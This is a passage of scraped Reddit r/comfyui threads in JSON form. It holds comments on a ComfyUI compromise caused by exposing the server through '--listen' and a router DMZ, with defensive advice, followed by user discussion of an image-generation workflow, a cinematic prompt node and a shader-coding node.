                  "text": "But is it node infected? I'm trying to determine if I should remove it.",
                  "score": 2,
                  "created_utc": "2026-01-26 06:18:48",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1sazgk",
          "author": "ThinkingWithPortal",
          "text": "This is really bad. I'm not on a DMZ, but I am on containers and Nginx Proxy Manager so safer but still concerning... thanks for the heads up on this.",
          "score": 2,
          "created_utc": "2026-01-26 08:34:28",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1swxb6",
          "author": "mdmachine",
          "text": "Use something like tailscale, better yet docker, even better both.\n\nAnother layer you can utilize is a 5g router (for example) behind a CGNAT. \n\nSeems it is a open port scanner? Node might not even be relevant? \n\nAnd DMZ is a BIG ASS NO-NO!!! Jeez!",
          "score": 2,
          "created_utc": "2026-01-26 11:48:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1vu1ob",
          "author": "alexmizell",
          "text": "The problem here is not comfy ui it's that you defeated your own firewall.  It's likely that there are other vulnerable apps on your computer that could also be exploited. when hackers are given this much surface area to work with they will nearly always find something.",
          "score": 2,
          "created_utc": "2026-01-26 20:12:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1w6nan",
              "author": "Bender1012",
              "text": "Indeed",
              "score": 0,
              "created_utc": "2026-01-26 21:08:18",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1rn1o3",
          "author": "oasuke",
          "text": "Why would an attacker post their messages in the terminal for the user to see lol. Vibe coded malware?",
          "score": 5,
          "created_utc": "2026-01-26 05:22:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1s12v0",
              "author": "Carnildo",
              "text": "No, the expected use for this malware is for when an attacker has managed to get a shell on a machine and is looking to expand their foothold.  The messages are intended to be displayed to the attacker, not the victim.\n\nIn the OP's case, they're being targeted by blind injection -- the attacker is running commands with the intention of eventually exfiltrating data or getting a remote shell, but can't see what's actually happening on the victim's machine.",
              "score": 8,
              "created_utc": "2026-01-26 07:08:49",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1s27p8",
                  "author": "Bender1012",
                  "text": "Yes, I was saved by some of the command outputs being displayed directly in my ComfyUI terminal which is how I knew something was wrong. I later had to check my bash history which showed me the full extent of what commands the attacker did.",
                  "score": 3,
                  "created_utc": "2026-01-26 07:18:19",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1sh3yq",
              "author": "Aggressive-Bother470",
              "text": "Didn't unset histfile either.¬†",
              "score": 1,
              "created_utc": "2026-01-26 09:30:35",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1s3z97",
              "author": "ANR2ME",
              "text": "A kind attacker may be üòÅ",
              "score": 1,
              "created_utc": "2026-01-26 07:33:21",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1s1upq",
          "author": "cypherx89",
          "text": "Oof that‚Äôs suxs man did  u also run comfy as administrator ? , fyi if you want to setup remote access use witeguard or something to tunnel traffic. Dont fully expose via DMZ host mode.",
          "score": 2,
          "created_utc": "2026-01-26 07:15:14",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1rx3hs",
          "author": "Jealous_Piece_1703",
          "text": "Dear god not Easy use! Gotta check my system now!",
          "score": 2,
          "created_utc": "2026-01-26 06:36:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1sfkty",
              "author": "Carnildo",
              "text": "The problem isn't Easy-Use, it's the combination of \"--listen\" plus the router DMZ setting.  That lets anyone on the internet play around with your installation of ComfyUI.",
              "score": 8,
              "created_utc": "2026-01-26 09:16:17",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1vr3ky",
              "author": "Kinsiinoo",
              "text": "There is nothing wrong with the easy-use node. The root cause was the --listen flag not correctly used by OP.",
              "score": 2,
              "created_utc": "2026-01-26 19:59:19",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1s4q4j",
              "author": "S7venE11even",
              "text": "Let us know if you find something please.",
              "score": 4,
              "created_utc": "2026-01-26 07:39:44",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1sak0w",
                  "author": "Jealous_Piece_1703",
                  "text": "I have old versions, did not update it, And no there is nothing sus happening from it in my old version.",
                  "score": 2,
                  "created_utc": "2026-01-26 08:30:33",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1t9rnn",
          "author": "jib_reddit",
          "text": "Judt turning --listen is a well know and huge security theat, thats why it is off by default.",
          "score": 1,
          "created_utc": "2026-01-26 13:15:59",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1tahxo",
              "author": "ResponsibleTruck4717",
              "text": "Don't we need to use --listen when running it inside container?  \nI'm asking since my experience with docker is quite limited I run comfyui on sand box, in other words I'm asking to learn.",
              "score": 2,
              "created_utc": "2026-01-26 13:20:18",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1v0wbj",
                  "author": "Zangwuz",
                  "text": "Yes there is several cases where we need to use the --listen flag but the issue with op is not just the --listen flag but the fact that he had DMZ host enabled without any restriction apparently. There is people out there that scan ip address + port randomly. And if you keep the default port, 8188 here, you make it easier for them.",
                  "score": 2,
                  "created_utc": "2026-01-26 18:08:18",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1ua0vj",
          "author": "dllm0604",
          "text": "Unrelated to Comfy, a thing to consider doing is to only have SSH private keys in TPM, Windows Hello, or Secure Enclave. It‚Äôs not difficult to do anymore.",
          "score": 1,
          "created_utc": "2026-01-26 16:12:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1uuzr1",
          "author": "pfn0",
          "text": "ssh tunnel, port forward. problem solved. (use pki for ssh only, no passwords, secure your keys). putting your comfyui out in the public is asking for it to be abused, anyone could run any generation or workflow they want on your setup.",
          "score": 1,
          "created_utc": "2026-01-26 17:42:45",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1wfv6d",
          "author": "superstarbootlegs",
          "text": "So, opened yourself up to the internet and let everyone have a go on your machine. You should probably update that a bit more clearly there, but at least you/we now know this wasnt ComfyUI, I guess.",
          "score": 1,
          "created_utc": "2026-01-26 21:49:06",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1wk8dn",
          "author": "tequiila",
          "text": "**can never trust** [**comfyui-easy-use**](https://github.com/yolain/ComfyUI-Easy-Use)**. a while back someone put his face on one of the nodes so his (or someones) face comes up on every generation you do.**",
          "score": 1,
          "created_utc": "2026-01-26 22:08:50",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1rnhyd",
          "author": "lundrog",
          "text": "Yikes",
          "score": 1,
          "created_utc": "2026-01-26 05:25:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1t2nc3",
          "author": "cicoles",
          "text": "Wow that is scary. I realized that ComfyUI was getting too bloated and complex and vibe coded an image generator that has all the features I want in image gen in a weekend.\n\nI think as time goes by, people will be using their own vibe coded solutions.",
          "score": 0,
          "created_utc": "2026-01-26 12:30:19",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1sl087",
          "author": "GraftingRayman",
          "text": "One question I have, did you install the comfy-easy-use nodes via the manager or a git clone manually?\n\nWondering if it was a forked version that has dodgy code",
          "score": 0,
          "created_utc": "2026-01-26 10:06:30",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1vplxa",
          "author": "addrainer",
          "text": "So did you locate the trouble causing custom node?",
          "score": 0,
          "created_utc": "2026-01-26 19:52:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1teuen",
          "author": "Then_Gas712",
          "text": "Oh, very bad indeed... but which country are you?",
          "score": -2,
          "created_utc": "2026-01-26 13:44:34",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qim6km",
      "title": "Complete FLUX.2 Klein Workflow",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qim6km",
      "author": "No_Percentage1138",
      "created_utc": "2026-01-21 02:57:58",
      "score": 209,
      "num_comments": 22,
      "upvote_ratio": 0.98,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Workflow Included",
      "permalink": "https://reddit.com/r/comfyui/comments/1qim6km/complete_flux2_klein_workflow/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o0tp86o",
          "author": "oeufp",
          "text": "upvoted just for adding \".json\" to the file name on pastebin",
          "score": 26,
          "created_utc": "2026-01-21 08:56:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0tjuo3",
          "author": "Relevant_Eggplant180",
          "text": "Thanks for sharing. Looks very useful. I will give it a go.",
          "score": 5,
          "created_utc": "2026-01-21 08:05:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0tfa7v",
          "author": "Upset-Virus9034",
          "text": "pixaroma robot :)",
          "score": 3,
          "created_utc": "2026-01-21 07:23:06",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0uifqt",
              "author": "No_Percentage1138",
              "text": "Yeah, and easy-install\nI just learn to use it this days",
              "score": 2,
              "created_utc": "2026-01-21 12:58:00",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0uj2ex",
                  "author": "Upset-Virus9034",
                  "text": "Thanks for sharing üôè",
                  "score": 2,
                  "created_utc": "2026-01-21 13:01:55",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0w3825",
          "author": "FvMetternich",
          "text": "that looks like a brillilant idea with the reference numbers! thanks for sharing that gold nugget.",
          "score": 4,
          "created_utc": "2026-01-21 17:35:46",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0zm97e",
          "author": "wjc_5",
          "text": "This reference method is very convenient",
          "score": 3,
          "created_utc": "2026-01-22 04:15:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0uzkpk",
          "author": "BarkLicker",
          "text": "I'm so sad that the images aren't zero-indexed. I don't care either way, but I wish the world was consistent in this.",
          "score": 2,
          "created_utc": "2026-01-21 14:33:07",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0v04zr",
              "author": "No_Percentage1138",
              "text": "Yeah, but the node I use to preview the Images start from 1, that make the things harder",
              "score": 3,
              "created_utc": "2026-01-21 14:36:03",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0v9tx0",
          "author": "sir-bantzalot",
          "text": "This is very interesting. How do you use the references in the second field? It says 2, 3 6",
          "score": 2,
          "created_utc": "2026-01-21 15:23:14",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0w1v3f",
              "author": "No_Percentage1138",
              "text": "Well it loads all the images from the folder and in the field where I chose the images to use I put the names of the files, in the examples are 1,2,3,4,5,6 to make it easier to understand and more consistent with the Index. And if the name of the files apear in the list then it will load the images in the CLIP",
              "score": 4,
              "created_utc": "2026-01-21 17:29:41",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0xzrc1",
          "author": "RayHell666",
          "text": "Is the bug with \"control after generate\" in subgraph fixed yet ?",
          "score": 2,
          "created_utc": "2026-01-21 22:47:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0y2c6q",
              "author": "No_Percentage1138",
              "text": "If you mean that the file search range doesn‚Äôt update when the folder gets updated: no, I didn‚Äôt find a way to fix it. My temporary workaround is to rename the folder where the reference images are stored, and then update the path in the workflow.",
              "score": 2,
              "created_utc": "2026-01-21 23:00:07",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0y5ly9",
                  "author": "RayHell666",
                  "text": "no just talking about the seed control.",
                  "score": 2,
                  "created_utc": "2026-01-21 23:17:21",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0y68lz",
          "author": "FreezaSama",
          "text": "What a boss thanks",
          "score": 2,
          "created_utc": "2026-01-21 23:20:42",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0ybqqn",
          "author": "Whole_Disk3247",
          "text": "Multi-image doesn't work as great as it seems. I had a few bad anatomical ones.",
          "score": 1,
          "created_utc": "2026-01-21 23:50:30",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0ynssd",
              "author": "No_Percentage1138",
              "text": "Yeah, Flux.2 Klein isn't so good with anatomy. Maybe with some Lora or ControlNet you will have a better resoult",
              "score": 2,
              "created_utc": "2026-01-22 00:55:37",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0yzlxg",
          "author": "juandann",
          "text": "can klein fix messed up anatomy?",
          "score": 1,
          "created_utc": "2026-01-22 02:02:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1e2zmc",
          "author": "TheRealAncientBeing",
          "text": "Mine ends up in a \n\nmat1 and mat2 shapes cannot be multiplied (512x4096 and 12288x4096)\n\nany idea? tried with different, smaller background and images?",
          "score": 1,
          "created_utc": "2026-01-24 07:44:27",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1e5mco",
              "author": "TheRealAncientBeing",
              "text": "Layer 8 problem: Misclicked the matching text encoder for the 9B.\n\nResults: It uses the background image but there is ZERO resemblance to the (people) reference pics, really nothing, except perhaps hair color.",
              "score": 1,
              "created_utc": "2026-01-24 08:07:55",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1v78lp",
          "author": "Careful_Ad_482",
          "text": "Werde ich sp√§ter mal testen",
          "score": 1,
          "created_utc": "2026-01-26 18:34:46",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qipxhx",
      "title": "I ported my personal prompting tool into ComfyUI - A visual node for building cinematic shots",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/r/comfyui/comments/1qipxhx/i_ported_my_personal_prompting_tool_into_comfyui/",
      "author": "shamomylle",
      "created_utc": "2026-01-21 05:59:49",
      "score": 175,
      "num_comments": 45,
      "upvote_ratio": 0.99,
      "text": "https://reddit.com/link/1qipxhx/video/jqr07t0smneg1/player\n\nhttps://preview.redd.it/2u6d7as9iueg1.png?width=1524&format=png&auto=webp&s=42e4b9a7c6e09ec1362e3a2f4e097f36c6a39d04\n\nHi everyone,\n\nI wanted to share my very first custom node for ComfyUI. I'm still very new to ComfyUI (I usually just do 3D/Unity stuff), but I really wanted to port a personal tool I made into ComfyUI to streamline my workflow.\n\nI originally created this tool as a website to help me self-study cinematic shots, specifically to memorize what different camera angles, lighting setups (like Rembrandt or Volumetric), and focal lengths actually look like (link to the original tool : [https://yedp123.github.io/](https://yedp123.github.io/)).\n\n**What it does:** It replaces the standard CLIP Text Encode node but adds a visual interface. You can select:\n\n* Camera Angles (Dutch, Low, High, etc.)\n* Lighting Styles\n* Focal Lengths & Aperture\n* Film Stocks & Color Palettes\n\nIt updates the preview image in real-time when you hover over the different options so you can see a reference of what that term means before you generate. You can also edit the final prompt string if you want to add/remove things. It outputs the string + conditioning for Stable Diffusion, Flux, Nanobanana or Midjourney.\n\nLike I mentioned above, I just started playing with ComfyUI so I am not sure if this can be of any help to any of you or if there are flaws with it, but here's the link if you want to give it a try. Thanks, Have a good day!\n\n**Links:** [https://github.com/yedp123/ComfyUI-Cinematic-Prompt](https://github.com/yedp123/ComfyUI-Cinematic-Prompt)\n\n***-----------------------------------------------------------------------------------------***\n\n***UPDATE: added \"Cinematic Reference Loader\", an Image Loader node which lets the user select an image among the image assets to use for Image-to-Image workflows***",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/comfyui/comments/1qipxhx/i_ported_my_personal_prompting_tool_into_comfyui/",
      "domain": "self.comfyui",
      "is_self": true,
      "comments": [
        {
          "id": "o0thf5z",
          "author": "BarGroundbreaking624",
          "text": "Can you output the image to use as depth map or for image to image ? I‚Äôve been prototyping that but not close to how this looks.",
          "score": 10,
          "created_utc": "2026-01-21 07:42:46",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0tkwnu",
              "author": "shamomylle",
              "text": "Oh, I see what you mean! currently, the images in the node are just static reference jpg to help visualize the prompt terms (like a dictionary). The node only outputs the Text and Conditioning data, not the actual image shown in the preview, sorry for the confusion !  \n  \nFor now, the preview images are just static assets stored in the node's folder. The node doesn't currently have an `IMAGE` output to send them directly to other nodes via wires.\n\nHowever, if you really like a specific reference image (like the \"Low Angle\" shot for instance) and want to use it for ControlNet, you can find all the source images in your `custom_nodes/ComfyUI_Cinematic_Prompt/web/assets/` folder and load them into a standard 'Load Image' node",
              "score": 6,
              "created_utc": "2026-01-21 08:15:06",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0tn8c5",
                  "author": "Gilgameshcomputing",
                  "text": "agree that getting that image output would be really useful - I suspect Klein would make short work of turning it into a decent image.",
                  "score": 4,
                  "created_utc": "2026-01-21 08:37:20",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o0u9cl7",
                  "author": "SvenVargHimmel",
                  "text": "Unfortunately i don't know much about the web/\\*\\* folder when building a node. Is there a way to keep the choices made in the UI in-sync with the node backend. \n\nI think I can make the image out change but I don't know enough about the frontend and backend sync designs.  Any pointers ?",
                  "score": 1,
                  "created_utc": "2026-01-21 11:55:26",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o0tl6ra",
              "author": "noyart",
              "text": "Would be cool if you could do a simple 3D scene in comfyui. But you can do scenes in either blender and daz3D.¬†\n\n\nMy last try I made a scene in DaZ3D and than renderd it(dont need to be perfect), put that image in comfyui, convert to depth map with depth anything v3. It worked really good.",
              "score": 2,
              "created_utc": "2026-01-21 08:17:46",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0tniw0",
                  "author": "shamomylle",
                  "text": "I hear you! I also do 3D block out that I feed to Nanobanana Pro at the moment, but I would eventually like to move to ComfyUI, I still have to learn the basics! Building a full 3D viewport inside a node would be an awesome project, but definitely a massive undertaking compared to this!",
                  "score": 3,
                  "created_utc": "2026-01-21 08:40:09",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            },
            {
              "id": "o106xld",
              "author": "shamomylle",
              "text": "Just included an Image Loader node to let you select and use these preview pictures for Image-to-Image, you just need to redownload and replace your current *ComfyUI\\_Cinematic\\_Prompt* folder :)",
              "score": 2,
              "created_utc": "2026-01-22 06:48:10",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0towua",
          "author": "Past_Ad6251",
          "text": "Thank for sharing! One tip for guys using Qwen Image, if you put camera brand in the prompt, you will find the camera itself in the generated image, which may not be what you needed.",
          "score": 6,
          "created_utc": "2026-01-21 08:53:19",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0tpsd5",
              "author": "shamomylle",
              "text": "Thanks a lot for the feedback, that's good to know!   \nI haven't played much with Qwen yet but this is a Chinese model, you might have to go through some prompt translation to get it to work, it is most likely a lot better at adherence when it is written in Chinese.",
              "score": 1,
              "created_utc": "2026-01-21 09:01:41",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0tbvcn",
          "author": "Momkiller781",
          "text": "This looks fantastic!  I'll try it today. Thank you for sharing!",
          "score": 2,
          "created_utc": "2026-01-21 06:52:50",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0tkbjx",
          "author": "Zakki_Zak",
          "text": "I wish I had your self discipline!",
          "score": 2,
          "created_utc": "2026-01-21 08:09:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0tj1js",
          "author": "pharaohfx",
          "text": "Wow",
          "score": 1,
          "created_utc": "2026-01-21 07:57:39",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0tkffy",
          "author": "Substantial_Aid",
          "text": "Will give it a try later today. Thank you for this!",
          "score": 1,
          "created_utc": "2026-01-21 08:10:39",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0tldzn",
          "author": "jumpinthewatersnice",
          "text": "Having worked in film and tv for over 20 years im looking forward to testing this",
          "score": 1,
          "created_utc": "2026-01-21 08:19:39",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0tmsp2",
              "author": "shamomylle",
              "text": "You would probably find some of the preview pictures highly inaccurate or find the tool incomplete, but I look forward to your feedbacks and if you think it can be a decent educational tool, thanks! :)",
              "score": 1,
              "created_utc": "2026-01-21 08:33:06",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0vq57a",
                  "author": "oodelay",
                  "text": "Doesn't matter, I also worked in the domain and words follow trends and locality. A pan shot can be explained twelve ways by twelve experts.",
                  "score": 1,
                  "created_utc": "2026-01-21 16:37:07",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0tm7cx",
          "author": "mrgonuts",
          "text": "Looks intresting thanks",
          "score": 1,
          "created_utc": "2026-01-21 08:27:21",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0tv2x3",
          "author": "TheTimster666",
          "text": "Looks great, gotta try the node!   \nOne thing: I only tried it on the website so don't know if the node is the same, but after you choose something, eg \"Lighting\"->\"Blue Hour\" you can't deselect/default that option to \"None/Default\" again.",
          "score": 1,
          "created_utc": "2026-01-21 09:52:53",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0tx2sr",
              "author": "shamomylle",
              "text": "You are totally right, I can't believe I missed such an important feature, I will update the node right away! Good catch, thanks a lot!\n\n**EDIT:** Made it so that everything can be selected manually and added a \"Reset\" button to unselect everything.",
              "score": 2,
              "created_utc": "2026-01-21 10:11:34",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0txwr4",
                  "author": "TheTimster666",
                  "text": "Awesome :-)",
                  "score": 1,
                  "created_utc": "2026-01-21 10:19:16",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0txvsy",
          "author": "KeyTumbleweed5903",
          "text": "gettign error - any idea why\n\nhttps://preview.redd.it/0f32l22phoeg1.png?width=1235&format=png&auto=webp&s=2d768ab135ec87627ea22bff54bb1d8244c7fdc8",
          "score": 1,
          "created_utc": "2026-01-21 10:19:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0tzrdg",
              "author": "shamomylle",
              "text": "it is hard to tell from the picture, it seems everything is properly connected, can you show the exact error message?",
              "score": 2,
              "created_utc": "2026-01-21 10:36:11",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0u1wsd",
                  "author": "KeyTumbleweed5903",
                  "text": "https://preview.redd.it/up2b55d5ooeg1.png?width=943&format=png&auto=webp&s=4f181480b64d178fe697bd62a72cb47886e48270",
                  "score": 1,
                  "created_utc": "2026-01-21 10:55:13",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0uwj93",
          "author": "Mysterious_Pride_858",
          "text": "Excellent node. It allows for intuitive viewing of examples for each prompt. Are there any plans to add Z-image or Flux2 klein? I tested the Flux prompts on Flux klein2, and there were significant issues with generating the structure of human figures.",
          "score": 1,
          "created_utc": "2026-01-21 14:17:22",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0uyw4a",
              "author": "shamomylle",
              "text": "Thanks for the feedback, ~~I never tried it with these models, I would have to do some tests with various prompt styles to understand how it behaves, did you try with a simple text encode before or simpler prompt too? Does it manage to generate good pictures? If yes, I would be interested in knowing what prompt you used, thanks!~~ Also you can try adding things like negative prompting, such as \"bad anatomy, missing limbs, deformed hands/face\" and see if there is any improvement.\n\n**UPDATE:** make sure you have your KSampler denoise set to 1.0 if you aren't doing any editing and just trying to generate pictures, it should avoid any kind of \"creative\" liberties.\n\nhttps://preview.redd.it/l8bnns4jlteg1.png?width=371&format=png&auto=webp&s=abf538391fe3679f5846afce2f85f13917db2878",
              "score": 1,
              "created_utc": "2026-01-21 14:29:33",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0wle9w",
          "author": "Sad-Investigator-81",
          "text": "this is really cool !  for some reason though midjourny ignores the camera angle part of the prompt",
          "score": 1,
          "created_utc": "2026-01-21 18:55:18",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0xy2z1",
              "author": "shamomylle",
              "text": "Thanks for the feedback, this is weird, I do not use midjourney but I will check if there is an issue with the final prompt formatting. Is the camera angle the only issue you have or do you also have any other issues when it comes to prompt adherence?\nFor now (if you want), you can try to use another model format or try to copy the generated prompt in a regular CLIP text encode to see if the issue really comes with my node or the prompt itself",
              "score": 1,
              "created_utc": "2026-01-21 22:38:38",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0zcj3j",
          "author": "SheepherderNo6921",
          "text": "very interesting! Congratulations, it looks fantastic :D",
          "score": 1,
          "created_utc": "2026-01-22 03:15:43",
          "is_submitter": false,
          "replies": [
            {
              "id": "o128jjz",
              "author": "shamomylle",
              "text": "Thanks for the kind words :)",
              "score": 1,
              "created_utc": "2026-01-22 15:33:29",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o16u09l",
          "author": "Kaoru-Kun",
          "text": "Hey firstly, thank you so much! I manually do similar inputs so I know this tool will save me so much time!!\n\nIn your video you can scroll through the options. When I added it to my workflow, I don‚Äôt get the scroll bar (just one super large list) and therefore I can‚Äôt see the preview when I am selecting some of the options at the bottom of the list.¬†\nThe whole node seems to be locked in on its size, how can that be fixed?¬†",
          "score": 1,
          "created_utc": "2026-01-23 05:38:33",
          "is_submitter": false,
          "replies": [
            {
              "id": "o176zqh",
              "author": "shamomylle",
              "text": "Hello, thank you for your feedback!  \nSorry to hear you are getting an issue with the scrolling, are both nodes acting the same way? Did you try to rescale the node, delete them and add them again in the project? Also if you install/update the nodes while your ComfyUI session is open it might mess with the cache files or not work properly.  \nJust for test I redownloaded and reinstalled the node from the github repository and it behaves normally.\n\nLet me know if anything worked.",
              "score": 2,
              "created_utc": "2026-01-23 07:23:05",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o17a5tj",
                  "author": "Kaoru-Kun",
                  "text": "Hi, thanks for the quick feedback. Sorry, giving input to what I have tried would have helped the discussion (thought in hindsight).¬†\n\nI installed the node directly by cloning the GitHub repository into my folder which worked fine.¬†\n\nAfter inserting the node into the workflow, I can expand the node to make it bigger, but somehow it cannot be resized to anything smaller than the list.¬†\n\nThis is the same for both nodes that come with the tool.¬†\n\nAn update and restart to comfy don‚Äôt fix it.¬†\n\nI‚Äôm running Comfy 3.39.2.¬†\n\nAnyway, no big deal. I love the tool a lot and am using it from the website now to help design the prompt.¬†\nPerhaps this weekend I‚Äôll try to look into the issue more and if I can work something out I‚Äôll post my solution here.¬†",
                  "score": 1,
                  "created_utc": "2026-01-23 07:51:03",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qkowfo",
      "title": "Creative Code",
      "subreddit": "comfyui",
      "url": "https://v.redd.it/yoec80at83fg1",
      "author": "skbphy",
      "created_utc": "2026-01-23 11:58:30",
      "score": 154,
      "num_comments": 15,
      "upvote_ratio": 0.98,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/comfyui/comments/1qkowfo/creative_code/",
      "domain": "v.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o184mdx",
          "author": "LeKhang98",
          "text": "ELI5 please? Is it a node that I can put simple code directly into it to process input (image, latent, audio, etc)? As a non-coder I'd love to be able to do that.",
          "score": 5,
          "created_utc": "2026-01-23 12:15:49",
          "is_submitter": false,
          "replies": [
            {
              "id": "o186h4q",
              "author": "skbphy",
              "text": "It‚Äôs a creative coding node (GLSL/ShaderToy + p5.js) that renders images/animation frames in ComfyUI. Even if you don‚Äôt code, you can use built-in animations and the AI(ollama) helper. The focus is visuals/animation, not general audio processing(You *can* use the rendered image in latent workflows by encoding it back to latent), but the node itself doesn‚Äôt directly process latents.).  English isn‚Äôt my first language, but I hope I explained it clearly.",
              "score": 7,
              "created_utc": "2026-01-23 12:28:33",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o19ji8t",
                  "author": "LeKhang98",
                  "text": "Thank you I understand it now.",
                  "score": 2,
                  "created_utc": "2026-01-23 16:38:44",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o18lz63",
          "author": "FreezaSama",
          "text": "I would love to try this or similar IF it takes the input image in consideration. This node doesn't seem to do that all the times?",
          "score": 4,
          "created_utc": "2026-01-23 13:59:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18rxg1",
              "author": "skbphy",
              "text": "[https://github.com/SKBv0/ComfyUI\\_CreativeCode/blob/main/HOW\\_TO\\_USE.md#using-textures](https://github.com/SKBv0/ComfyUI_CreativeCode/blob/main/HOW_TO_USE.md#using-textures) check this out",
              "score": 1,
              "created_utc": "2026-01-23 14:29:42",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o18lsd5",
          "author": "bingobongo3001",
          "text": "I just love the way it looks!",
          "score": 2,
          "created_utc": "2026-01-23 13:58:03",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1bpehf",
          "author": "pwillia7",
          "text": "Dude COOL! -- Does this work fine with the API?",
          "score": 2,
          "created_utc": "2026-01-23 22:40:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1c5m5z",
              "author": "skbphy",
              "text": "No idea. I haven't tested it.",
              "score": 1,
              "created_utc": "2026-01-24 00:06:58",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1jthq6",
              "author": "deadzenspider",
              "text": "I‚Äôm pretty sure you can export the JSON API for every workflow and then run it via websockets",
              "score": 1,
              "created_utc": "2026-01-25 03:03:23",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1jtrra",
                  "author": "pwillia7",
                  "text": "some logic nodes don't work for a reason I can't now remember",
                  "score": 1,
                  "created_utc": "2026-01-25 03:04:58",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o186xf5",
